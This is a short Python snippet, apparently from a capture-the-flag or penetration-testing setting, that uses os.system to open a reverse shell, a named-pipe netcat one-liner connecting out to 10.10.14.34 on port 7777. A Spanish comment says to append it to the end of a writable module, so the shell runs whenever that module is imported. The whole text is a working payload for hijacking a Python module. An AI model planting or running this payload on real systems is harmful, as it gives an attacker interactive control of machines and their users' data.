import os 
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 7777 >/tmp/f')

#Meter al final del modulo en el que se puede escribir.
